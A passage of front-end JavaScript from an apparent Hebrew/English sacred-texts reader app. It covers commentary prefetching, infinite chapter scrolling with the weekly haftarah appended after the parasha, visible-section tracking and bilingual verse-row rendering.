                collapseCommentaryPanel();
                return;
            }

            if (pending) mergeLateWordMeaning(wordPromise, cleanWord, isCurrent);

            selectionCommentaryState.groupedCommentaries = groupedCommentaries;
            const wordNotFound = Boolean(cleanWord && wordInfo?.notFound);
            selectionCommentaryState.wordInfo = hasWordMeaning || wordNotFound ? normalizeWordInfo(wordInfo, cleanWord) : null;
            selectionCommentaryState.selectedText = selectedText;
            setCommentaryAvailability(true);

            renderSelectionInsightsChooser();
            showSelectionInsights();
            revealCommentarySidebar();
        }

        let selectionInsightsSeq = 0;
        let selectionInsightsTimer = null;

        // Head start for the links lookup: a text selection begins with a
        // pointerdown on the verse, ~150ms+ before mouseup and the debounced
        // updateSelectionInsights() run, so start the segment-level request
        // then. One request per verse (cached + de-duplicated in
        // fetchCommentaryLinks), primary text only.
        function prefetchSegmentCommentaryLinks(event) {
            if (appState.currentView?.type !== 'text' || !isCommentaryEligiblePrimaryText()) return;
            const segmentRow = event.target?.closest?.('.segment-row');
            if (!segmentRow?.dataset?.segment) return;
            // The verse the reader pressed on is the verse they are on: the
            // preloader loads its commentary and text (and, if the panel is
            // following the reading, lists it).
            const preloader = ensureCommentaryPreloader();
            if (preloader) {
                preloader.focusRow(segmentRow);
                return;
            }
            const normalized = commentaryRefForRow(segmentRow);
            if (normalized) fetchCommentaryLinks(normalized);
        }

        function scheduleSelectionInsightsUpdate() {
            if (selectionInsightsTimer) {
                clearTimeout(selectionInsightsTimer);
            }
            selectionInsightsTimer = setTimeout(() => {
                void updateSelectionInsights();
            }, 120);
        }

        function bindSelectionInsightsEvents() {
            const targets = [
                document.getElementById('readerSources'),
                document.getElementById('readerContent'),
            ];

            targets.forEach((target) => {
                if (!target || target.dataset.selectionBound === '1') return;
                target.dataset.selectionBound = '1';
                target.addEventListener('pointerdown', prefetchSegmentCommentaryLinks, { passive: true });
                target.addEventListener('mouseup', scheduleSelectionInsightsUpdate);
                target.addEventListener('touchend', scheduleSelectionInsightsUpdate);
                target.addEventListener('keyup', scheduleSelectionInsightsUpdate);
            });
        }

        function getRefTrackingKey(refValue) {
            const normalized = normalizeLibraryLookupKey(refValue);
            if (normalized) return normalized;
            return String(refValue || '').toLowerCase().trim();
        }

        function getCurrentTextPayloadChain() {
            if (Array.isArray(window.currentTextPayloadChain) && window.currentTextPayloadChain.length) {
                return window.currentTextPayloadChain.filter(Boolean);
            }
            return window.currentTextPayload ? [window.currentTextPayload] : [];
        }

        function normalizeAdjacentRef(refValue) {
            return String(refValue || '')
                .replace(/\s+/g, ' ')
                .trim()
                .replace(/:\d+(?:-\d+)?$/i, '')
                .toLowerCase();
        }

        async function ensurePayloadAdjacentRefs(payload) {
            if (!payload || typeof payload !== 'object') return payload;
            if (payload.prev && payload.next) return payload;

            const currentRef = String(payload.ref || '').trim();
            if (!currentRef) return payload;

            const indexTitle = String(payload.title || '').trim() || currentRef.replace(/^(\S+(?:\s+\S+)*?)\s+\S+$/, '$1').trim();
            if (!indexTitle) return payload;

            const refs = await fetchIndexLeafRefs(indexTitle);
            if (!Array.isArray(refs) || refs.length < 2) return payload;

            const compactRefs = [];
            const seen = new Set();
            refs.forEach((ref) => {
                const normalized = normalizeAdjacentRef(ref);
                if (!normalized || seen.has(normalized)) return;
                seen.add(normalized);
                compactRefs.push(String(ref).replace(/\s+/g, ' ').trim().replace(/:\d+(?:-\d+)?$/i, ''));
            });
            if (compactRefs.length < 2) return payload;

            const currentNormalized = normalizeAdjacentRef(currentRef);
            const idx = compactRefs.findIndex((ref) => normalizeAdjacentRef(ref) === currentNormalized);
            if (idx < 0) return payload;

            if (!payload.prev && idx > 0) {
                payload.prev = compactRefs[idx - 1];
            }
            if (!payload.next && idx < compactRefs.length - 1) {
                payload.next = compactRefs[idx + 1];
            }

            return payload;
        }

        function resetInfiniteReaderState(seedPayload = null) {
            infiniteReaderState.loading = false;
            infiniteReaderState.loadingPrev = false;
            infiniteReaderState.nextRef = String(seedPayload?.next || '').trim();
            infiniteReaderState.prevRef = String(seedPayload?.prev || '').trim();
            infiniteReaderState.haftarah = null;
            infiniteReaderState.seenRefs = new Set();
            infiniteReaderState.currentVisibleChunkIndex = 0;

            if (infiniteReaderState.sectionObserver) {
                infiniteReaderState.sectionObserver.disconnect();
                infiniteReaderState.sectionObserver = null;
            }

            let seedChain = [];
            if (Array.isArray(window.currentTextPayloadChain)) seedChain = window.currentTextPayloadChain;
            else if (seedPayload) seedChain = [seedPayload];

            seedChain.forEach((chunk) => {
                const refKey = getRefTrackingKey(chunk?.ref || chunk?.title || '');
                if (refKey) infiniteReaderState.seenRefs.add(refKey);
            });

            // Clear prevRef if it is already loaded in the chain
            if (infiniteReaderState.prevRef) {
                const prevKey = getRefTrackingKey(infiniteReaderState.prevRef);
                if (prevKey && infiniteReaderState.seenRefs.has(prevKey)) {
                    infiniteReaderState.prevRef = '';
                }
            }
        }

        function shouldLoadNextTextChunk(thresholdPx = 420) {
            if (appState.currentView?.type !== 'text') return false;
            if (infiniteReaderState.loading) return false;

            const nextRef = String(infiniteReaderState.nextRef || '').trim();
            if (!nextRef) return false;

            const nextRefKey = getRefTrackingKey(nextRef);
            if (nextRefKey && infiniteReaderState.seenRefs.has(nextRefKey)) {
                return false;
            }

            const target = getPrimaryScrollElement();
            const isPageTarget = target === document.documentElement || target === document.body;
            const distanceFromBottom = isPageTarget
                ? Math.max(0, (document.documentElement.scrollHeight || 0) - ((window.pageYOffset || 0) + window.innerHeight))
                : Math.max(0, target.scrollHeight - (target.scrollTop + target.clientHeight));

            return distanceFromBottom <= thresholdPx;
        }

        // ─── Haftarah after the weekly parasha ──────────────────────────────────
        // The week's parasha and its haftarah for the reader's community. One
        // cache slot per community (the haftarah differs between them in some
        // weeks); a request already in flight is shared.
        function readerCommunity() {
            return window.ShelahState?.getMinhag?.() || 'sephardi';
        }

        function freshWeeklyParasha() {
            const cached = textsCache.parashaQuickLink;
            return cached && cached.minhag === readerCommunity()
                && (Date.now() - textsCache.parashaQuickLinkTs) < PARASHA_CACHE_TTL_MS
                ? cached
                : null;
        }

        function fetchWeeklyParasha() {
            const fresh = freshWeeklyParasha();
            if (fresh) return Promise.resolve(fresh);
            const minhag = readerCommunity();
            if (textsCache.parashaRequest?.minhag === minhag) return textsCache.parashaRequest.promise;

            const promise = (async () => {
                const resp = await fetch(`/api/parasha?minhag=${encodeURIComponent(minhag)}`);
                if (!resp.ok) throw new Error(`parasha ${resp.status}`);

                const data = await resp.json();
                const enTitle = (data.title || 'Parashat HaShavua').trim();
                // The Sefaria-calendars source (data.source === 'sefaria-calendars')
                // always includes a Hebrew title; the Hebcal-converter fallback
                // (data.source === 'calendar-fallback', used when Sefaria is down)
                // only returns the bare English parasha name. Derive the Hebrew
                // name ourselves in that case rather than showing English text
                // under a Hebrew-mode heading.
                const heTitle = (data.heTitle || '').trim() || holidayNameToHebrew(enTitle);
                const haftarahRef = String(data.haftarah?.ref || '').trim();
                const payload = {
                    ref: data.ref || 'Genesis 1',
                    enTitle,
                    heTitle,
                    minhag,
                    haftarah: haftarahRef ? { ref: haftarahRef, heTitle: String(data.haftarah.heTitle || '').trim() } : null,
                };
                payload.titleEn = payload.heTitle
                    ? `${payload.enTitle} · ${payload.heTitle}`
                    : payload.enTitle;
                payload.titleHe = payload.heTitle || payload.enTitle;

                textsCache.parashaQuickLink = payload;
                textsCache.parashaQuickLinkTs = Date.now();
                return payload;
            })().finally(() => {
                if (textsCache.parashaRequest?.promise === promise) textsCache.parashaRequest = null;
            });
            textsCache.parashaRequest = { minhag, promise };
            return promise;
        }

        // The week's haftarah when `chunk` is the week's parasha, else null.
        function weeklyHaftarahFor(chunk, weekly) {
            if (!weekly?.haftarah?.ref) return null;
            const parashaKey = getRefTrackingKey(weekly.ref);
            return parashaKey && getRefTrackingKey(chunk?.ref) === parashaKey ? weekly.haftarah : null;
        }

        // The parasha's own `next` runs on into the following chapter of the
        // Torah; the week's reading ends with its haftarah, so that comes next.
        function followWithHaftarah(haftarah) {
            infiniteReaderState.haftarah = haftarah;
            infiniteReaderState.nextRef = haftarah.ref;
        }

        function haftarahIsNext() {
            const haftarah = infiniteReaderState.haftarah;
            return Boolean(haftarah && infiniteReaderState.nextRef
                && getRefTrackingKey(infiniteReaderState.nextRef) === getRefTrackingKey(haftarah.ref));
        }

        // Only the parasha the reader just opened, and only while nothing has
        // been appended after it yet.
        async function followWeeklyParashaWithHaftarah(data) {
            try {
                const haftarah = weeklyHaftarahFor(data, await fetchWeeklyParasha());
                const chain = getCurrentTextPayloadChain();
                if (!haftarah || window.currentTextPayload !== data || chain[chain.length - 1] !== data) return;
                followWithHaftarah(haftarah);
                const status = document.getElementById('infiniteReaderStatus');
                if (status) status.outerHTML = infiniteReaderStatusMarkup();
                if (shouldLoadNextTextChunk(260)) void loadNextTextChunk();
            } catch {
                // No haftarah to show: the reader ends where it always did.
            }
        }

        // "Haftarah — Isaiah 40:27-41:16": the reference in the reader's own
        // language, set apart (bdi) so its punctuation keeps its order in a
        // right-to-left line.
        function haftarahHeadingMarkup(ref, heTitle) {
            const label = isHebrewMode()
                ? (String(heTitle || '').trim() || localizeReferenceLabel(ref))
                : String(ref || '').trim();
            return `${escapeHtml(t('Haftarah', 'הפטרה'))} — <bdi>${escapeHtml(label)}</bdi>`;
        }

        function infiniteReaderStatusMarkup() {
            if (appState.currentView?.type !== 'text') return '';
            if (infiniteReaderState.loading) {
                const heading = haftarahIsNext()
                    ? `<h2 class="reader-haftarah-heading">${haftarahHeadingMarkup(infiniteReaderState.haftarah.ref, infiniteReaderState.haftarah.heTitle)}</h2>`
                    : '';
                return `<div id="infiniteReaderStatus" role="status" aria-live="polite" class="${heading ? 'reader-haftarah-pending' : 'mt-3'} space-y-2">
                    ${heading}
                    <div class="sk-reader-para" aria-hidden="true"></div>
                    <div class="sk-reader-para" aria-hidden="true" style="width:80%"></div>
                </div>`;
            }
            if (infiniteReaderState.nextRef) {
                const label = haftarahIsNext()
                    ? haftarahHeadingMarkup(infiniteReaderState.haftarah.ref, infiniteReaderState.haftarah.heTitle)
                    : escapeHtml(infiniteReaderState.nextRef);
                return `<div id="infiniteReaderStatus" class="mt-3 text-center font-serif text-sm text-slate-600"><span class="underline underline-offset-4 decoration-slate-300">${label}</span></div>`;
            }
            return `<div id="infiniteReaderStatus" class="mt-3 text-xs text-slate-400 italic">${t('End of available sections.', 'סוף הקטעים הזמינים.')}</div>`;
        }

        async function loadNextTextChunk() {
            if (!shouldLoadNextTextChunk()) return;

            const requestedNextRef = String(infiniteReaderState.nextRef || '').trim();
            if (!requestedNextRef) return;

            const loadingHaftarah = haftarahIsNext();
            // Read before the await: a new text resets the state while this fetch runs.
            const haftarahHeTitle = infiniteReaderState.haftarah?.heTitle || '';
            infiniteReaderState.loading = true;
            renderCurrentTextByLayout({ preserveScroll: false });

            try {
                const { payload: fetched, resolvedRef } = await fetchTextPayloadWithFallback(requestedNextRef);
                if (!fetched || fetched.error) {
                    logReliability('text-next-load-error', {
                        requested: requestedNextRef,
                        error: fetched?.error || 'unknown',
                    });
                    infiniteReaderState.nextRef = '';
                    return;
                }

                // The haftarah is a reading of its own: the chapters around it in
                // the Prophets are not what follows or precedes it here. A copy,
                // so the cached payload stays a plain text.
                const nextData = loadingHaftarah
                    ? { ...fetched, kind: 'haftarah', haftarahHeTitle, next: '', prev: '' }
                    : fetched;
                if (!loadingHaftarah) await ensurePayloadAdjacentRefs(nextData);

                const resolved = String(nextData.ref || resolvedRef || requestedNextRef).trim();
                const resolvedKey = getRefTrackingKey(resolved);

                if (!Array.isArray(window.currentTextPayloadChain)) {
                    window.currentTextPayloadChain = window.currentTextPayload ? [window.currentTextPayload] : [];
                }

                if (!resolvedKey || !infiniteReaderState.seenRefs.has(resolvedKey)) {
                    window.currentTextPayloadChain.push(nextData);
                    if (resolvedKey) infiniteReaderState.seenRefs.add(resolvedKey);
                }

                infiniteReaderState.nextRef = String(nextData.next || '').trim();
                const nextRefKey = getRefTrackingKey(infiniteReaderState.nextRef);
                if (nextRefKey && infiniteReaderState.seenRefs.has(nextRefKey)) {
                    infiniteReaderState.nextRef = '';
                }
            } catch (error) {
                logReliability('text-next-load-network-error', {
                    requested: requestedNextRef,
                    message: error.message,
                });
                infiniteReaderState.nextRef = '';
            } finally {
                infiniteReaderState.loading = false;
                renderCurrentTextByLayout({ preserveScroll: false });
            }
        }

        // ─── Scroll-Up Listener ──────────────────────────────────────────────────
        function setupScrollUpListener() {
            const scrollEl = getPrimaryScrollElement();
            if (!scrollEl) return;

            // getPrimaryScrollElement() can return a different node across
            // renders (window vs. #mainContainer, depending on whether the
            // container is currently the overflow owner). Removing from the
            // *new* element when the old listener lived on a different one
            // was a no-op, so stale listeners piled up on abandoned
            // elements and kept firing on residual scroll events —
            // triggering unwanted loadPreviousTextChunk() calls that made
            // the reader appear to jump back into earlier text on its own.
            if (window.readerScrollUpHandler && window.readerScrollUpListenerEl) {
                window.readerScrollUpListenerEl.removeEventListener('scroll', window.readerScrollUpHandler);
            }

            let lastScrollPos = (scrollEl === document.documentElement || scrollEl === document.body)
                ? (window.pageYOffset || 0)
                : scrollEl.scrollTop;

            window.readerScrollUpHandler = function () {
                if (appState.currentView?.type !== 'text') return;
                const scrollPos = (scrollEl === document.documentElement || scrollEl === document.body)
                    ? (window.pageYOffset || 0)
                    : scrollEl.scrollTop;
                // Require an actual upward gesture near the top (not merely
                // "currently near the top"), so landing on a fresh chunk at
                // scrollPos 0 — or any programmatic/smooth scroll-to-top —
                // can't itself trigger an unrequested previous-chunk load.
                const scrolledUp = scrollPos < lastScrollPos;
                lastScrollPos = scrollPos;
                if (scrolledUp && scrollPos <= 350 && infiniteReaderState.prevRef && !infiniteReaderState.loadingPrev && !infiniteReaderState.loading) {
                    void loadPreviousTextChunk();
                }
            };
            window.readerScrollUpListenerEl = scrollEl;
            scrollEl.addEventListener('scroll', window.readerScrollUpHandler, { passive: true });
        }

        // ─── Section Visibility Observer ─────────────────────────────────────────
        function setupSectionScrollObserver() {
            if (infiniteReaderState.sectionObserver) {
                infiniteReaderState.sectionObserver.disconnect();
                infiniteReaderState.sectionObserver = null;
            }
            const chunks = document.querySelectorAll('.reader-source-clean[data-text-chunk-index]');
            if (!chunks.length) return;

            infiniteReaderState.sectionObserver = new IntersectionObserver(() => {
                // IntersectionObserver only reports the targets whose ratio
                // just crossed a threshold, not every observed chunk -- e.g.
                // appending the next chapter delivers only *its* first entry,
                // which used to win by default before the chunk already on
                // screen (Genesis 1:5) ever got a say, flipping the URL/title
                // to it although nobody scrolled. Re-measure every observed
                // chunk's live position instead of reading the choice off
                // `entries`, so it's the same regardless of which targets
                // this particular callback batch happened to include.
                pickVisibleReaderChunk();
            }, { threshold: [0, 0.15, 0.35, 0.6, 1.0], rootMargin: '-8% 0px -35% 0px' });

            chunks.forEach(chunk => infiniteReaderState.sectionObserver.observe(chunk));
        }

        // Picks the chunk the reader is actually reading, across *all*
        // observed chunks at once: chunks stack top-to-bottom in document
        // order, so the first (topmost) one whose bottom hasn't yet
        // scrolled above a reading line near the top of the observer's own
        // active zone (the same 8%-from-top edge as its rootMargin above)
        // is the one still being read. Deciding by position rather than by
        // how much of a chunk (or a neighbour) is visible is what keeps a
        // long chunk the reader is mid-way through from losing to a short,
        // fully-visible neighbour (the intent the old ratio-vs-absolute-px
        // comparison protected) -- and unlike comparing each chunk's own
        // top, it isn't thrown off by the gap between chunks changing size
        // (e.g. a chunk gaining its own title bar once it's no longer the
        // first one, right after a chapter is prepended above it): a chunk
        // only stops "current" once its content has actually scrolled past,
        // not because of whitespace above the next one. It also doesn't
        // flip just because a new chunk was appended below (the line
        // hasn't moved, so the same chunk still hasn't finished), and it
        // keeps working when previous chapters are prepended and the
        // anchor restore moves scrollTop to compensate, since rects are
        // read live off the DOM, not off whichever entries this particular
        // callback batch happened to include.
        function pickVisibleReaderChunk() {
            const chunks = Array.from(document.querySelectorAll('.reader-source-clean[data-text-chunk-index]'))
                .map((el) => ({ idx: Number.parseInt(el.dataset.textChunkIndex, 10), rect: el.getBoundingClientRect() }))
                .filter((c) => !Number.isNaN(c.idx))
                .sort((a, b) => a.idx - b.idx);
            if (!chunks.length) return;

            const scrollEl = getPrimaryScrollElement();
            const isPageTarget = scrollEl === document.documentElement || scrollEl === document.body;
            const viewportTop = isPageTarget ? 0 : scrollEl.getBoundingClientRect().top;
            const viewportHeight = isPageTarget ? window.innerHeight : scrollEl.clientHeight;
            const readingLine = viewportTop + viewportHeight * 0.08;

            const current = chunks.find((c) => c.rect.bottom > readingLine) || chunks.at(-1);
            const resolvedIndex = current.idx;

            if (resolvedIndex !== infiniteReaderState.currentVisibleChunkIndex) {
                infiniteReaderState.currentVisibleChunkIndex = resolvedIndex;
            }
            updateReaderButtonsForChunk(resolvedIndex);
        }

        // ─── Update Prev/Next Buttons for Visible Chunk ───────────────────────────
        // The reader's previous/next button: it steps to the neighbouring chunk
        // on the page (`inPageIndex`), else, at the end of the page, reads the
        // neighbouring text (`adjacentRef()`, looked up when it is clicked).
        function wireReaderStepButton(button, { inPageIndex, adjacentRef }) {
            if (!button) return;
            const hasStep = inPageIndex !== null || Boolean(adjacentRef());
            button.disabled = !hasStep;
            button.style.visibility = hasStep ? 'visible' : 'hidden';
            button.onclick = hasStep ? () => {
                if (inPageIndex !== null) {
                    const target = document.querySelector(`.reader-source-clean[data-text-chunk-index="${inPageIndex}"]`);
                    if (target) target.scrollIntoView({ behavior: scrollBehavior(), block: 'start' });
                } else {
                    void readText(adjacentRef(), { skipNavigationGrid: true });
                }
            } : null;
        }

        function updateReaderButtonsForChunk(chunkIndex) {
            const chain = getCurrentTextPayloadChain();
            if (!chain.length) return;
            updateReaderHeaderForVisibleChunk(chunkIndex);
            wireReaderStepButton(readerPrevTopBarBtn, {
                inPageIndex: chunkIndex > 0 ? chunkIndex - 1 : null,
                adjacentRef: () => infiniteReaderState.prevRef,
            });
            wireReaderStepButton(readerNextTopBarBtn, {
                inPageIndex: chunkIndex < chain.length - 1 ? chunkIndex + 1 : null,
                adjacentRef: () => infiniteReaderState.nextRef,
            });
        }

        // ─── Load Previous Text Chunk ─────────────────────────────────────────────
        async function loadPreviousTextChunk() {
            if (infiniteReaderState.loadingPrev) return;
            const requestedPrevRef = String(infiniteReaderState.prevRef || '').trim();
            if (!requestedPrevRef) return;

            const prevRefKey = getRefTrackingKey(requestedPrevRef);
            if (prevRefKey && infiniteReaderState.seenRefs.has(prevRefKey)) {
                infiniteReaderState.prevRef = '';
                return;
            }

            infiniteReaderState.loadingPrev = true;

            try {
                const { payload: prevData, resolvedRef } = await fetchTextPayloadWithFallback(requestedPrevRef);
                if (!prevData || prevData.error) {
                    logReliability('text-prev-load-error', {
                        requested: requestedPrevRef,
                        error: prevData?.error || 'unknown',
                    });
                    infiniteReaderState.prevRef = '';
                    return;
                }

                await ensurePayloadAdjacentRefs(prevData);

                const resolved = String(prevData.ref || resolvedRef || requestedPrevRef).trim();
                const resolvedKey = getRefTrackingKey(resolved);

                if (!Array.isArray(window.currentTextPayloadChain)) {
                    window.currentTextPayloadChain = window.currentTextPayload ? [window.currentTextPayload] : [];
                }

                if (!resolvedKey || !infiniteReaderState.seenRefs.has(resolvedKey)) {
                    window.currentTextPayloadChain.unshift(prevData); // prepend
                    if (resolvedKey) infiniteReaderState.seenRefs.add(resolvedKey);
                    // Shift visible index forward since we prepended
                    infiniteReaderState.currentVisibleChunkIndex += 1;
                }

                infiniteReaderState.prevRef = String(prevData.prev || '').trim();
                const newPrevKey = getRefTrackingKey(infiniteReaderState.prevRef);
                if (newPrevKey && infiniteReaderState.seenRefs.has(newPrevKey)) {
                    infiniteReaderState.prevRef = '';
                }
            } catch (error) {
                logReliability('text-prev-load-network-error', {
                    requested: requestedPrevRef,
                    message: error.message,
                });
                infiniteReaderState.prevRef = '';
            } finally {
                infiniteReaderState.loadingPrev = false;
                // Anchor on the section the reader was looking at, not the
                // absolute scrollTop: restoring the same scrollTop after a
                // prepend left the view inside the *new* section near the
                // top, so the next momentum scroll event immediately loaded
                // another one — chaining several sections back in one swipe.
                renderCurrentTextByLayout({ anchorToVisibleChunk: true });
            }
        }

        function renderTextRowsForPayload(data, layout) {
            const cleanLine = (text = '') => {
                const normalized = escapeDisplayTextPreservingEmphasis(text);
                return normalized
                    .replace(/\n{2,}/g, '<br><br>')
                    .replaceAll('\n', ' ')
                    .replace(/\bG\s+OD\b/g, 'GOD')
                    .replace(/\bL\s+ORD\b/g, 'LORD');
            };

            if (!Array.isArray(data?.lines) || !data.lines.length) {
                return `<p class="text-slate-500 italic">${t('No text content found for this reference.', 'לא נמצא תוכן טקסט עבור הפניה זו.')}</p>`;
            }

            return data.lines.map((line, idx) => {
                const heRaw = normalizeDisplayText(line.he || '');
                const enRaw = normalizeDisplayText(line.en || '');
                return textRowMarkup(layout, {
                    he: heRaw ? cleanLine(applyHebrewDisplaySettings(line.he || '')) : '',
                    en: enRaw ? cleanLine(line.en || '') : '',
                    label: formatSegmentLabel(line.segment, idx),
                    segment: escapeHtml(String(line.segment || '')),
                    translit: appState.prefs.transliteration ? transliterationMarkup(heRaw) : '',
                });
            }).join('');
        }

        function readerHebrewBlock({ he, translit }) {
            return he
                ? `<div class="source-he reader-text-he text-start font-hebrew text-2xl lg:text-3xl leading-[1.8] lg:leading-9 py-2" dir="rtl"><p>${he}</p>${translit}</div>`
                : '';
        }

        function readerEnglishBlock({ en }) {
            return en
                ? `<div class="source-en reader-text-en font-serif leading-relaxed py-2 text-slate-700 text-lg" dir="ltr"><p>${en}</p></div>`
                : '';
        }

        function singleColumnTextRow({ label, segment }, body) {
            return `
                <div class="source-grid segment-row reader-text-row reader-single-row grid grid-cols-1 border-b border-slate-200 last:border-b-0" data-segment="${segment}">
                    <span class="segment-label reader-row-right-label">${label}</span>
                    ${body}
                </div>
            `;
        }

        // One verse/segment row in the layout the reader chose.
        function textRowMarkup(layout, row) {
            const { he, en, label, segment, translit } = row;
            if (layout === 'english') {
                const englishLine = en
                    ? `<p>${en}</p>`
                    : `<p class="text-slate-400 italic text-sm">${t('No translation available.', 'אין תרגום זמין.')}</p>`;
                return singleColumnTextRow(row, `<div class="source-en reader-text-en font-serif leading-relaxed py-2 text-slate-700 text-lg" dir="ltr">${englishLine}</div>`);
            }

            if (layout === 'hebrew') {
                const hebrewLine = he
                    ? `<p>${he}</p>${translit}`
                    : `<p class="text-slate-400 italic text-sm">${t('No Hebrew text in this segment.', 'אין טקסט עברי בקטע זה.')}</p>`;
                return singleColumnTextRow(row, `<div class="source-he reader-text-he text-start font-hebrew text-2xl lg:text-3xl leading-[1.8] lg:leading-9 py-2" dir="rtl">${hebrewLine}</div>`);
            }

            if (layout === 'interleaved') {
                // Only render blocks that have content
                const enPart = readerEnglishBlock(row).replace('source-en reader-text-en', 'source-en reader-text-en mt-2 text-start');
                return `
                    <div class="source-grid source-grid-interleaved segment-row reader-text-row reader-interleaved-row grid grid-cols-1 border-b border-slate-200 last:border-b-0" data-segment="${segment}">
                        <span class="segment-label reader-row-right-label">${label}</span>
                        ${readerHebrewBlock(row)}${enPart}
                    </div>
                `;
            }

            // Bilingual side-by-side layouts: only show columns that have content
            if (he && en) {
                const reverse = layout === 'bilingual-reverse';
                return `
                    <div class="source-grid segment-row reader-text-row reader-side-row grid grid-cols-1 lg:grid-cols-2 lg:gap-x-6 border-b border-slate-200 last:border-b-0" data-segment="${segment}">
                        <span class="segment-label reader-row-mid-label">${label}</span>
                        ${reverse ? readerEnglishBlock(row) : readerHebrewBlock(row)}
                        ${reverse ? readerHebrewBlock(row) : readerEnglishBlock(row)}
                    </div>
                `;
            }

            // Only one side has content: render full-width single column
            return singleColumnTextRow(row, he
                ? `<div class="source-he reader-text-he text-start font-hebrew text-2xl lg:text-3xl leading-[1.8] lg:leading-9 py-2" dir="rtl"><p>${he}</p>${translit}</div>`
                : `<div class="source-en reader-text-en font-serif leading-relaxed py-2 text-slate-700 text-lg" dir="ltr"><p>${en}</p></div>`);
        }

        function hebrewSectionTail(tail) {
            return tail.replace(/(\d+)([ab])?/gi, (_, n, side) => {
                let sideLabel = '';
                if (side) sideLabel = side.toLowerCase() === 'a' ? ' ע״א' : ' ע״ב';
                return hebrewNumber(n) + sideLabel;
            });
        }

        // A chunk's header in Hebrew mode, or null when it has nothing to say.
        function hebrewChunkTitle({ titleEn, titleHe, chunkRef }) {
            // heTitle is only the book ("במדבר"); a ref with a section
            // gives the exact place ("במדבר ה׳").
            if (/\d/.test(chunkRef)) {
                const located = localizeReferenceLabel(chunkRef);
                if (located && !/[A-Za-z]/.test(located)) return located;
                // Book name unknown to the local maps ("Shulchan Arukh,
                // Orach Chayim 345"): Sefaria's heTitle + the section.
                const tail = /\s(\d+[ab]?(?:[:.]\d+)*(?:-\d+[ab]?(?:[:.]\d+)*)?)$/i.exec(chunkRef)?.[1];
                if (titleHe && tail) return `${titleHe} ${hebrewSectionTail(tail)}`;
            }
            if (titleHe) return titleHe;
            if (titleEn) return localizeReferenceLabel(titleEn);
            return null;
        }

        function englishChunkTitle(chunk, { titleEn, titleHe }) {
            if (!titleEn) return null;
            // A Chumash chapter's header already names its parashah in
            // English, so it doesn't also need the Hebrew book name.
            if (getChunkParashaLabel(chunk)) return titleEn;
            return titleHe && titleHe !== titleEn ? `${titleEn} · ${titleHe}` : titleEn;
        }

        function getChunkDisplayTitle(chunk = {}) {
            const names = {
                titleEn: String(chunk?.title || '').trim(),
                titleHe: String(chunk?.heTitle || '').trim(),
                chunkRef: String(chunk?.ref || '').trim(),
            };
            const hebrew = isHebrewMode();
            const title = hebrew ? hebrewChunkTitle(names) : englishChunkTitle(chunk, names);
            if (title !== null) return title;

            const ref = String(chunk?.ref || '').trim();
            if (!ref) {
                return t('Text Section', 'קטע טקסט');
            }

            return hebrew ? localizeReferenceLabel(ref) : ref;
        }

        // The reader header: exact place plus the weekly portion, e.g.
        // "במדבר ה׳ · פרשת נשא" / "Numbers 5 · Parashat Naso".
        function getChunkHeaderTitle(chunk = {}) {
            return [getChunkDisplayTitle(chunk), getChunkParashaLabel(chunk)].filter(Boolean).join(' · ');
        }

        function getChunkDisplayRef(chunk = {}) {
            const ref = String(chunk?.ref || '').trim();
            if (!ref) return '';
            return isHebrewMode() ? localizeReferenceLabel(ref) : ref;
        }

        function isLikelyDuplicateLabel(primary = '', secondary = '') {
            const normalize = (value) => String(value || '')
                .toLowerCase()
                .replace(/[^a-z0-9\u0590-\u05ff\s]/gi, ' ')
                .replace(/\s+/g, ' ')
                .trim();

            const a = normalize(primary);
            const b = normalize(secondary);
            if (!a || !b) return false;
            if (a === b) return true;
            return a.includes(b) || b.includes(a);
        }

        function getChunkParashaLabel(chunk = {}) {
            const sectionRef = String(chunk?.ref || appState.currentView?.value || '').trim();
            if (!sectionRef || !hebrewRef) return '';
            return hebrewRef.parashaLabel(sectionRef, isHebrewMode() ? 'he' : 'en');
        }

        // True when `routeRef` points inside `chunkRef` ("Genesis.1" or
        // "Orach_Chayim.261.2" inside "Genesis 1" / "Orach Chayim 261"), so
        // a link to a specific verse/seif isn't widened to its chapter.
        function textRefWithin(routeRef, chunkRef) {
            const norm = (v) => String(v || '').replaceAll(/[._]/g, ' ').replace(/\s+/g, ' ').trim().toLowerCase();
            const inner = norm(routeRef);
            const outer = norm(chunkRef);
            if (!outer || !inner.startsWith(outer)) return false;
            const next = inner.charAt(outer.length);
            return next === '' || next === ' ' || next === ':' || next === '-';
        }

        // Keeps ?text= on the section the reader is actually looking at as
        // infinite scroll moves through chapters, so a refresh or a copied
        // URL lands there. replaceState: scrolling shouldn't add a Back entry
        // per chapter.
        // A link in another spelling -- /text/genesis.1, a Hebrew ref -- moves
        // to the API's own ref in place once the text loads (audit U-16/U-17):
        // one URL, and one canonical, per text. A click already pushes it.
        function canonicalizeTextRoute(ref) {
            const router = window.ShelahRouter;
            const canonical = String(ref || '').trim();
            if (!router || !canonical) return;
            const route = router.readRoute();
            // A verse link stays on its verse, inside the chapter shown.
            if (!route.text || route.text === canonical || textRefWithin(route.text, canonical)) return;
            router.pushRoute({ text: canonical }, { replace: true });
        }

        function syncVisibleTextRoute(chunk) {
            const router = window.ShelahRouter;
            const ref = String(chunk?.ref || '').trim();
            if (!router || !ref) return;
            const route = router.readRoute();
            if (!route.text || route.text === ref || textRefWithin(route.text, ref)) return;
            router.pushRoute({ text: ref }, { replace: true });
        }

        function updateReaderHeaderForVisibleChunk(chunkIndex) {
            if (appState.currentView?.type !== 'text') return;

            const chain = getCurrentTextPayloadChain();
            if (!chain.length) return;
            const clampedIndex = Math.min(Math.max(Number(chunkIndex) || 0, 0), chain.length - 1);
            const chunk = chain[clampedIndex] || chain[0];

            syncVisibleTextRoute(chunk);

            const titleEl = document.getElementById('readerTitle');
            const headerTitle = getChunkHeaderTitle(chunk);

            if (titleEl && headerTitle) {
                titleEl.innerText = headerTitle;
            }

            // Keep the title block clean for text views: no repeated metadata subtitle.
            setReaderSubtitle('');
        }

        // Records which rendered section sits at the top of the viewport and
        // where, so a re-render that changes content *above* it (prepending
        // the previous section) can put it back at the same on-screen spot.
        // Anchor on the first verse row the reader can see (falling back to its
        // section): a section that stops being the first one gains its sticky
        // chapter-title bar on re-render, so anchoring on the section box
        // alone still let the text inside it shift down by that bar's height.
        function readerAnchorElements() {
            return Array.from(document.querySelectorAll('#readerSources .reader-source-clean[data-text-chunk-ref]'));
        }

        // Where `el`'s top rests once the entrance animations on it and its
        // ancestors (a chunk's fade-up: translateY(8px) -> 0) have played,
        // so a position read or restored mid-entrance isn't off by their
        // travel.
        function restingViewportTop(el) {
            let top = el.getBoundingClientRect().top;
            for (let node = el; node && node !== document.body; node = node.parentElement) {
